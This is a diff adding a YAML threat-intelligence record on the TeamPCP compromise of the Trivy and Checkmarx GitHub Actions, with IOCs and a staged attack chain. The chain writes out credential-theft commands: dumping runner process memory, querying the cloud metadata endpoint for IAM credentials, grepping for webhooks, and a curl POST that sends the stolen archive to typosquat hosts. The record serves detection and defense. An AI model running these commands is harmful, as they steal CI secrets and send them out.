@@ -1,0 +1,77 @@
+name: TeamPCP — Trivy/Checkmarx GitHub Actions Compromise
+threat_actor: TeamPCP
+campaign: CanisterWorm
+first_seen: 2026-03-19
+status: active
+
+summary: >
+  TeamPCP force-pushed 75 of 76 version tags in aquasecurity/trivy-action to malicious
+  commits containing a CI credential stealer. When workflows ran the compromised action,
+  a 4-stage payload harvested runner memory, IMDS credentials, and webhook URLs, then
+  exfiltrated an AES-256+RSA-4096 encrypted archive to a typosquat domain. Four days
+  later, the same payload appeared in Checkmarx/ast-github-action, using stolen PATs
+  from the Trivy wave to cascade the compromise.
+
+attack_chain:
+  - stage: 1
+    name: CI Runner Process Enumeration
+    technique: T1057 (Process Discovery)
+    description: >
+      pgrep and pidof used to enumerate Runner.Worker and Runner.Listener processes
+      before targeting their /proc/*/mem entries for secret extraction.
+    command: "pgrep -f Runner.Worker"
+
+  - stage: 2
+    name: Process Memory Extraction
+    technique: T1003 (OS Credential Dumping)
+    description: >
+      Direct read of /proc/<PID>/mem to extract plaintext secrets, tokens, and
+      environment variables from the runner process memory space.
+    command: "dd if=/proc/<PID>/mem ..."
+
+  - stage: 3
+    name: IMDS Credential Harvest
+    technique: T1552.005 (Cloud Instance Metadata API)
+    description: >
+      curl to 169.254.169.254 to retrieve temporary AWS IAM credentials associated
+      with the runner's instance role. Works on AWS and Azure-hosted runners.
+    command: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+  - stage: 4
+    name: Webhook URL Harvesting
+    technique: T1102 (Web Service — secondary exfil channel)
+    description: >
+      grep scan of the checked-out workspace for Slack and Discord webhook URLs,
+      used for secondary exfiltration and social engineering against victim teams.
+    command: "grep -r \"hooks.slack.com\\|discord.com/api/webhooks\" ."
+
+  - stage: 5
+    name: Encrypted Archive Exfiltration
+    technique: T1041 (Exfiltration Over C2 Channel)
+    description: >
+      AES-256-CBC + RSA-4096 OAEP encrypted archive (tpcp.tar.gz) uploaded via
+      curl POST with --data-binary and X-Filename header to vendor typosquat domains.
+      Trivy wave → scan.aquasecurtiy[.]org (45.148.10.212)
+      Checkmarx wave → checkmarx[.]zone (83.142.209.11)
+    command: "curl -X POST --data-binary @/tmp/tpcp.tar.gz -H 'X-Filename: tpcp.tar.gz' ..."
+
+iocs:
+  domains:
+    - scan.aquasecurtiy.org   # typosquat of aquasecurity.org
+    - checkmarx.zone           # typosquat of checkmarx.com
+  ips:
+    - 45.148.10.212
+    - 83.142.209.11
+  files:
+    - /tmp/tpcp.tar.gz
+  headers:
+    - "X-Filename: tpcp.tar.gz"
+
+compromised_actions:
+  - aquasecurity/trivy-action (75 of 76 tags)
+  - Checkmarx/ast-github-action v2.3.28
+  - checkmarx/kics-github-action (35 tags)
+
+references:
+  - hades/writeups/teampcp-checkmarx-supply-chain.md
+  - hades/detect/threats/teampcp.yaml
